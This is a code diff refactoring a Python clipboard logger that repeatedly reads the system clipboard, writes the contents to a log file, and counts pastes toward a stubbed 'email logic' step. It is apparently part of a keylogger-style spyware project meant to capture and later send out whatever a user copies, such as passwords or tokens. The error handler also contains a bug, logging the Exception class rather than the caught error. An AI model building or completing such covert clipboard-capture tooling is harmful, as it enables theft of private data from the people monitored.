@@ -1,33 +1,52 @@
 from pyperclip import paste
 from time import sleep
-from os import _exit
 from os.path import join
+import sys
 from utils.utils import log, handle_counter
 from config import LOGS_DIRECTORY_PATH, CLIPBOARD_INTERVAL, PASTES_PER_EMAIL
 
 
 class ClipboardLogger:
     def __init__(self):
-        self.logs_directory_path = LOGS_DIRECTORY_PATH
-        self.interval = CLIPBOARD_INTERVAL
+        self.log_file_path = (
+            join(LOGS_DIRECTORY_PATH, "clipboard.txt")
+            if LOGS_DIRECTORY_PATH
+            else "clipboard.txt"
+        )
+        self.error_file_path = (
+            join(LOGS_DIRECTORY_PATH, "errors.txt")
+            if LOGS_DIRECTORY_PATH
+            else "errors.txt"
+        )
         self.counter = 0
         self.counter_max = PASTES_PER_EMAIL
+        self.interval = CLIPBOARD_INTERVAL
         self.running = True
 
-    def log_clipboard(self):
-        log(f'{paste().replace("\n", r'\n')}', join(self.logs_directory_path, "clipboard.txt"))
+    def log_clipboard(self) -> None:
+        data = paste().replace("\n", r"\n")
+        log(data, self.log_file_path)
+
+    def handle_counter(self):
+        self.counter += 1
+        if handle_counter(self.counter, self.counter_max):
+            pass # TODO: Email logic
 
     def run(self):
         try:
             while self.running:
                 self.log_clipboard()
-                self.counter += 1
-                if handle_counter(self.counter, self.counter_max):
-                    pass  # email logic?
+                self.handle_counter()
                 sleep(self.interval)
+        except KeyboardInterrupt:
+            self.running = False
         except Exception as e:
-            log("AN ERROR OCCURED WHILE LOGGING CLIPBOARD:", "errors.txt")
-            log(e)
+            self.running = False
+            self.log_error("ERROR WHILE LOGGING CLIPBOARD:", Exception)
+
+    def log_error(self, message: str, exception: Exception) -> None:
+        log(message, self.error_file_path)
+        log(str(exception), self.error_file_path)
 
 
 def main():
@@ -35,13 +54,12 @@ def main():
     try:
         clipboard_logger.run()
     except Exception:
-        clipboard_logger.running = False
-        print("An error occured while logging clipboard.")
-        print("See full error here:")  # TODO:  add where to find error log
+        print("An error occurred while logging clipboard.")
+        print(f"See full error here: {clipboard_logger.error_file_path}")
         return 1
 
     return 0
 
 
 if __name__ == "__main__":
-    _exit(main())
+    sys.exit(main())
